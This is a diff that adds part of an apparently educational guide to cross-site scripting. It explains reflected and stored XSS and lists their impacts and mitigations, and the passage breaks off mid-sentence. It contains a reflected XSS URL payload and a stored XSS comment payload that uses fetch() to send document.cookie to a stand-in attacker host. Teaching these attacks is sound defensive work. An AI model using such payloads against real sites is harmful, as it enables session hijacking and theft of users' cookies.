@@ -63,4 +63,37 @@ Reflected XSS occurs when malicious input from a user is immediately returned by
 
 ### **Example:**
 ```http
-https://example.com/search?query=<script>alert('
+https://example.com/search?query=<script>alert('XSS')</script>
+```
+If the website displays `query` without sanitization, the script runs.
+
+### **Impact:**
+- Session hijacking via `document.cookie`.
+- Redirecting users to malicious sites (`window.location`).
+- Phishing attacks by modifying page content.
+
+### **Mitigation:**
+- Input validation & output encoding.
+- Using Content Security Policy (CSP).
+- Escaping user-supplied data before rendering.
+
+---
+
+## **2. Stored XSS (Persistent)**
+Stored XSS occurs when malicious scripts are permanently stored on a target server (e.g., in a database, comment section, or forum post) and later executed when other users access the infected page.
+
+### **How It Works:**
+- Attacker submits malicious input stored on the server.
+- Victim requests a page containing this stored data.
+- Server serves the malicious script to the victim’s browser.
+- Script executes in their context.
+
+### **Example:**
+A blog comment with:
+```html
+<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
+```
+When another user loads the page, their cookies are sent to the attacker.
+
+### **Impact:**
+- Long-term compromise of user
